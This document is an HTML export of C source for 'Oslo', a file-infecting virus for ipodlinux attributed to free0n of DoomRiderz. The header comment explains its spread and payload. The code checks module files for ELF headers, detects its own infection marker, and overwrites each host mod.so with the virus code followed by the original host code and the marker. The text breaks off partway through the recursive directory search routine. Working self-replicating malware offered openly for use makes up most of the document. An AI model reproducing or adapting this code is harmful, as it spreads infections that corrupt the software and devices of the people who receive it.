<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #008000;
}
.sc3 {
	color: #008080;
}
.sc4 {
	color: #FF8000;
}
.sc5 {
	font-weight: bold;
	color: #0000FF;
}
.sc6 {
	color: #808080;
}
.sc7 {
	color: #808080;
}
.sc9 {
	color: #804000;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc11 {
}
.sc16 {
	color: #8000FF;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">/*
Oslo Virus by free0n [DoomRiderz] 3/28/2007 -
ipodlinux

Now you might say how might a virus spread from one ipod to the other? Well
how did computer viruses first spread? those big black things called floppies!
The way I look at it is the ipod is the new floppy. It's nothing but a big hard
drive. And People share programs just like they used to do and it doesn't take 
much more then posting the file on a message board or giving it to a friend and 
it may not be rapid spreading like other viruses/worms out there today but 
think about just how young these ipods actually are.. they are just in their
infancy...

How it works:
1. Oslo register's it'self in the /Extras/Demos/ menu section
2. Waits for a user to execute it
3. Upon execution the virus does a recurisve search in /usr/lib for all mod.so
   files.
4. For each potential file it checks to see if the file is ELF and it looks for
   a marker "Oslo" at the end of the file.
5. IF the file hasn't been infected it writes it's code to the top of the file
   then writes the host and then the marker.
6. After each file has been infected it then displays it's payload message
   and a cool graphic of the ipodlinux tux penguin

greetz:genetix,necro,wargame,impurity,slage,hermit,cyneox,retro,DiA,hutley
       dref and all the others in #virus/vxers/vx-lab

tested: ipod 4g photo - ipodlinux podzilla2
*/</span><span class="sc0">

</span><span class="sc9">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;sys/dir.h&gt;
#include &lt;elf.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;string.h&gt;
#include &lt;errno.h&gt;
#include "pz.h"
</span><span class="sc0">
</span><span class="sc9">#define MARKER "Oslo"
#define ELFISH "\177ELF"
#define MAX_DIR_PATH 2048
</span><span class="sc0">
</span><span class="sc16">static</span><span class="sc0"> </span><span class="sc11">PzModule</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">module</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">static</span><span class="sc0"> </span><span class="sc11">ttk_surface</span><span class="sc0"> </span><span class="sc11">image</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">static</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">imgw</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">imgh</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">static</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">text</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">me</span><span class="sc10">;</span><span class="sc0">

</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">draw_oslo</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">PzWidget</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">wid</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ttk_surface</span><span class="sc0"> </span><span class="sc11">srf</span><span class="sc10">)</span><span class="sc0"> 
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc2">//this is not my handywork but that of the mymodule program but with some 
</span><span class="sc0">    </span><span class="sc2">//modification. This basically puts our payload together
</span><span class="sc0">    </span><span class="sc2">//it draws the text variable that's in oslo_window() and then
</span><span class="sc0">    </span><span class="sc2">//draws a dividing horizontal line that seperates the text and the coooool
</span><span class="sc0">    </span><span class="sc2">//ipodlinux tux penguin. 
</span><span class="sc0">    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">p</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">text</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">y</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">wid</span><span class="sc10">-&gt;</span><span class="sc11">y</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">5</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(*</span><span class="sc11">p</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">svch</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">strchr</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">p</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc7">'\n'</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">svch</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">strchr</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">p</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc7">'\n'</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc10">*</span><span class="sc11">strchr</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">p</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc7">'\n'</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">else</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
        </span><span class="sc11">svch</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc11">ttk_text</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">srf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ttk_textfont</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">wid</span><span class="sc10">-&gt;</span><span class="sc11">x</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">5</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">y</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ttk_makecol</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">BLACK</span><span class="sc10">),</span><span class="sc0"> </span><span class="sc11">p</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">p</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">strlen</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">p</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">y</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">ttk_text_height</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ttk_textfont</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">*</span><span class="sc11">p</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">svch</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(*</span><span class="sc11">p</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">p</span><span class="sc10">++;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc11">y</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc2">// Dividing line
</span><span class="sc0">    </span><span class="sc11">ttk_line</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">srf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">wid</span><span class="sc10">-&gt;</span><span class="sc11">x</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc4">5</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">y</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">wid</span><span class="sc10">-&gt;</span><span class="sc11">x</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">wid</span><span class="sc10">-&gt;</span><span class="sc11">w</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc4">5</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">y</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">ttk_makecol</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">DKGREY</span><span class="sc10">));</span><span class="sc0">
    
    </span><span class="sc11">y</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc4">6</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc2">// The image
</span><span class="sc0">    </span><span class="sc11">ttk_blit_image</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">image</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">srf</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">wid</span><span class="sc10">-&gt;</span><span class="sc11">x</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">wid</span><span class="sc10">-&gt;</span><span class="sc11">w</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc11">imgw</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">/</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">wid</span><span class="sc10">-&gt;</span><span class="sc11">y</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">wid</span><span class="sc10">-&gt;</span><span class="sc11">h</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc11">imgh</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">/</span><span class="sc0"> </span><span class="sc4">2</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">y</span><span class="sc0"> </span><span class="sc10">+=</span><span class="sc0"> </span><span class="sc11">imgh</span><span class="sc10">;</span><span class="sc0">
    
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">event_oslo</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">PzEvent</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">ev</span><span class="sc10">)</span><span class="sc0"> 
</span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc2">//how the events get handled in podzilla2 
</span><span class="sc0">    </span><span class="sc5">switch</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ev</span><span class="sc10">-&gt;</span><span class="sc11">type</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc11">PZ_EVENT_BUTTON_UP</span><span class="sc10">:</span><span class="sc0">
    </span><span class="sc11">pz_close_window</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ev</span><span class="sc10">-&gt;</span><span class="sc11">wid</span><span class="sc10">-&gt;</span><span class="sc11">win</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc11">PZ_EVENT_DESTROY</span><span class="sc10">:</span><span class="sc0">
    </span><span class="sc11">ttk_free_surface</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">image</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">free</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">text</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">IsElfish</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">hostFile</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">

   </span><span class="sc2">//this is kind of cool atleast for me
</span><span class="sc0">   </span><span class="sc2">//we use Elf32_Ehdr to check if the 
</span><span class="sc0">   </span><span class="sc2">//file is an elf file. We can also
</span><span class="sc0">   </span><span class="sc2">//check for other things but since
</span><span class="sc0">   </span><span class="sc2">//on ipodlinux they use &lt;file&gt;.mod.so
</span><span class="sc0">   </span><span class="sc2">//for their program.
</span><span class="sc0">   </span><span class="sc11">Elf32_Ehdr</span><span class="sc0"> </span><span class="sc11">elfHeader</span><span class="sc10">;</span><span class="sc0">

   </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">fd</span><span class="sc10">;</span><span class="sc0">
   </span><span class="sc5">if</span><span class="sc10">((</span><span class="sc11">fd</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">open</span><span class="sc10">(</span><span class="sc11">hostFile</span><span class="sc10">,</span><span class="sc11">O_RDONLY</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0">
      </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">

   </span><span class="sc11">read</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,&amp;</span><span class="sc11">elfHeader</span><span class="sc10">,</span><span class="sc5">sizeof</span><span class="sc10">(</span><span class="sc11">Elf32_Ehdr</span><span class="sc10">));</span><span class="sc0">
   </span><span class="sc11">close</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">);</span><span class="sc0">

   </span><span class="sc5">if</span><span class="sc10">((</span><span class="sc11">strncmp</span><span class="sc10">(</span><span class="sc11">elfHeader</span><span class="sc10">.</span><span class="sc11">e_ident</span><span class="sc10">,</span><span class="sc11">ELFISH</span><span class="sc10">,</span><span class="sc4">4</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
      </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
   
   </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">Infected</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">name</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
   </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">infected</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
   
   </span><span class="sc2">//check to see if the file is a elf file
</span><span class="sc0">   </span><span class="sc2">//if it's not then we don't care..
</span><span class="sc0">   </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">IsElfish</span><span class="sc10">(</span><span class="sc11">name</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">

      </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">fd</span><span class="sc10">;</span><span class="sc0">
      </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">size</span><span class="sc10">;</span><span class="sc0">
      </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">buf</span><span class="sc10">[</span><span class="sc4">64</span><span class="sc10">];</span><span class="sc0">
      </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">stat</span><span class="sc0"> </span><span class="sc11">statbuf</span><span class="sc10">;</span><span class="sc0">
      
      </span><span class="sc2">//retrieve file size then subtract end size - the length
</span><span class="sc0">      </span><span class="sc2">//of the marker. If the marker isn't found then we know
</span><span class="sc0">      </span><span class="sc2">//the file isn't infected yet...
</span><span class="sc0">
      </span><span class="sc11">stat</span><span class="sc10">(</span><span class="sc11">name</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc10">&amp;</span><span class="sc11">statbuf</span><span class="sc10">);</span><span class="sc0">
      </span><span class="sc11">size</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0">  </span><span class="sc11">statbuf</span><span class="sc10">.</span><span class="sc11">st_size</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc0"> </span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">MARKER</span><span class="sc10">);</span><span class="sc0">

      </span><span class="sc5">if</span><span class="sc10">((</span><span class="sc11">fd</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">open</span><span class="sc10">(</span><span class="sc11">name</span><span class="sc10">,</span><span class="sc11">O_RDONLY</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc10">-</span><span class="sc4">1</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">

          </span><span class="sc2">//read only the marker bytes or the bytes
</span><span class="sc0">          </span><span class="sc2">//where the marker might be...
</span><span class="sc0">          </span><span class="sc11">lseek</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">size</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">SEEK_SET</span><span class="sc10">);</span><span class="sc0">
      </span><span class="sc11">read</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">,&amp;</span><span class="sc11">buf</span><span class="sc10">,</span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">MARKER</span><span class="sc10">));</span><span class="sc0">
          </span><span class="sc11">close</span><span class="sc10">(</span><span class="sc11">fd</span><span class="sc10">);</span><span class="sc0"> 
          
          </span><span class="sc2">//compare what's in buf or the data that we read
</span><span class="sc0">      </span><span class="sc2">//in the file to what the marker is. MARKER = Oslo
</span><span class="sc0">          </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">((</span><span class="sc11">strncmp</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">buf</span><span class="sc10">,</span><span class="sc11">MARKER</span><span class="sc10">,</span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">MARKER</span><span class="sc10">)))</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
           </span><span class="sc11">infected</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
          </span><span class="sc10">}</span><span class="sc0">

          </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">name</span><span class="sc0"> </span><span class="sc10">==</span><span class="sc0"> </span><span class="sc11">me</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
             </span><span class="sc11">infected</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
          </span><span class="sc10">}</span><span class="sc0">
      </span><span class="sc10">}</span><span class="sc0"> 
   </span><span class="sc10">}</span><span class="sc0"> 
   </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">infected</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">fubar</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">host</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
   </span><span class="sc1">/*
     We aren't totally mean as I didn't want to overwrite all the module
     files that we found but instead we just put our code above all the
     other modules, so if someone wanted to clean it they could. But don't worry
     the effect that happens is the same as what an overwriter would do.
     
     The reason why it's not a prepender/appender/poly is because of the way ipodlinux registers.
     applications in the main menu. Since our virus is registered as Oslo and we 
     can't dynamically change what the register name is and build a new module on 
     ipodlinux(on the ipod) we can't change what to register the module as during infection.

     Thus when it loops over the modules to build the main navigation it won't
     show every infected module but just one in each navigation sub section.
     So after infection the only modules that they will see are the ones that
     either aren't infected yet or if all modules are infected it will only show
     Oslo 

   */</span><span class="sc0">

   </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">vsize</span><span class="sc10">,</span><span class="sc11">hsize</span><span class="sc10">;</span><span class="sc0">
   
   </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">stat</span><span class="sc0"> </span><span class="sc11">statbuf</span><span class="sc10">;</span><span class="sc0">
   </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">stat</span><span class="sc0"> </span><span class="sc11">statHostbuf</span><span class="sc10">;</span><span class="sc0">
   
   </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">vircode</span><span class="sc10">;</span><span class="sc0">
   </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">hostCode</span><span class="sc10">;</span><span class="sc0">
   
   </span><span class="sc11">FILE</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">fp</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">;</span><span class="sc0">
   </span><span class="sc11">FILE</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">tmpOslo</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">;</span><span class="sc0">
   </span><span class="sc11">FILE</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">fh</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">;</span><span class="sc0">

   </span><span class="sc2">// open up our known clean virus that's in
</span><span class="sc0">   </span><span class="sc2">// /usr/lib/oslo/ and read everything and store it in
</span><span class="sc0">   </span><span class="sc2">// vircode, then try and open up a new host file to infect 
</span><span class="sc0">   </span><span class="sc2">// after that we read the host code and put that in hostCode.
</span><span class="sc0">   </span><span class="sc2">// now we rewrite the mod.so file so it looks like this:
</span><span class="sc0">   </span><span class="sc2">// &lt;virus&gt;
</span><span class="sc0">   </span><span class="sc2">// &lt;host&gt;
</span><span class="sc0">   </span><span class="sc2">// &lt;marker&gt; = Oslo
</span><span class="sc0">
   </span><span class="sc11">fp</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">fopen</span><span class="sc10">(</span><span class="sc11">me</span><span class="sc10">,</span><span class="sc6">"rb"</span><span class="sc10">);</span><span class="sc0">
   </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">fp</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
      </span><span class="sc11">stat</span><span class="sc10">(</span><span class="sc11">me</span><span class="sc10">,&amp;</span><span class="sc11">statbuf</span><span class="sc10">);</span><span class="sc0">
      </span><span class="sc11">vsize</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">statbuf</span><span class="sc10">.</span><span class="sc11">st_size</span><span class="sc10">;</span><span class="sc0">
      </span><span class="sc11">vircode</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">malloc</span><span class="sc10">(</span><span class="sc11">vsize</span><span class="sc10">);</span><span class="sc0">
      </span><span class="sc11">fread</span><span class="sc10">(</span><span class="sc11">vircode</span><span class="sc10">,</span><span class="sc11">vsize</span><span class="sc10">,</span><span class="sc4">1</span><span class="sc10">,</span><span class="sc11">fp</span><span class="sc10">);</span><span class="sc0">
       
      </span><span class="sc11">fh</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">fopen</span><span class="sc10">(</span><span class="sc11">host</span><span class="sc10">,</span><span class="sc6">"rb"</span><span class="sc10">);</span><span class="sc0">
      </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">fh</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
         </span><span class="sc11">stat</span><span class="sc10">(</span><span class="sc11">host</span><span class="sc10">,&amp;</span><span class="sc11">statHostbuf</span><span class="sc10">);</span><span class="sc0">
         </span><span class="sc11">hsize</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">statHostbuf</span><span class="sc10">.</span><span class="sc11">st_size</span><span class="sc10">;</span><span class="sc0">
         </span><span class="sc11">hostCode</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">malloc</span><span class="sc10">(</span><span class="sc11">hsize</span><span class="sc10">);</span><span class="sc0">
         </span><span class="sc11">fread</span><span class="sc10">(</span><span class="sc11">hostCode</span><span class="sc10">,</span><span class="sc11">hsize</span><span class="sc10">,</span><span class="sc4">1</span><span class="sc10">,</span><span class="sc11">fh</span><span class="sc10">);</span><span class="sc0">

         </span><span class="sc11">tmpOslo</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">fopen</span><span class="sc10">(</span><span class="sc11">host</span><span class="sc10">,</span><span class="sc6">"wb"</span><span class="sc10">);</span><span class="sc0">
         </span><span class="sc5">if</span><span class="sc10">(</span><span class="sc11">tmpOslo</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc5">NULL</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">fwrite</span><span class="sc10">(</span><span class="sc11">vircode</span><span class="sc10">,</span><span class="sc11">vsize</span><span class="sc10">,</span><span class="sc4">1</span><span class="sc10">,</span><span class="sc11">tmpOslo</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">fwrite</span><span class="sc10">(</span><span class="sc11">hostCode</span><span class="sc10">,</span><span class="sc11">hsize</span><span class="sc10">,</span><span class="sc4">1</span><span class="sc10">,</span><span class="sc11">tmpOslo</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">fwrite</span><span class="sc10">(</span><span class="sc11">MARKER</span><span class="sc10">,</span><span class="sc11">strlen</span><span class="sc10">(</span><span class="sc11">MARKER</span><span class="sc10">),</span><span class="sc4">1</span><span class="sc10">,</span><span class="sc11">tmpOslo</span><span class="sc10">);</span><span class="sc0">
          </span><span class="sc10">}</span><span class="sc0">
          </span><span class="sc11">fclose</span><span class="sc10">(</span><span class="sc11">tmpOslo</span><span class="sc10">);</span><span class="sc0">
      </span><span class="sc11">free</span><span class="sc10">(</span><span class="sc11">hostCode</span><span class="sc10">);</span><span class="sc0">
       </span><span class="sc10">}</span><span class="sc0">
       </span><span class="sc11">free</span><span class="sc10">(</span><span class="sc11">vircode</span><span class="sc10">);</span><span class="sc0">
       </span><span class="sc11">fclose</span><span class="sc10">(</span><span class="sc11">fh</span><span class="sc10">);</span><span class="sc0">
   </span><span class="sc10">}</span><span class="sc0">
   </span><span class="sc11">fclose</span><span class="sc10">(</span><span class="sc11">fp</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">


</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">InfectFiles</span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">search</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">

   </span><span class="sc2">//this is my sweeeeet recurisve directory
</span><span class="sc0">   </span><span class="sc2">//search. It's awesome just look at it ;)
</span><span class="sc0">   </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">direct</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">DirEntryPtr</span><span class="sc10">;</span><span class="sc0">
   </span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">stat</span><span class="sc0"> </span><span class="sc11">statbuf</span><span class="sc10">;</span><span class="sc0">
   </span><span class="sc11">DIR</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">DirPtr</span><span class="sc10">;</span><span class="sc0">
   </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">cwd</span><span class="sc10">[</span><span class="sc11">MAX_DIR_PATH</span><span class="sc10">+</span><span class="sc4">1</span><span class="sc10">];</span><span class="sc0">

   </span><span class="sc5">if</span><span class="sc10">(!</span><span class="sc11">getcwd</span><span class="sc10">(</span><span class="sc11">cwd</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">MAX_DIR_PATH</span><span class="sc10">+</span><span class="sc4">1</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
      </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
   </span><span class="sc10">}</span><span class="sc0">

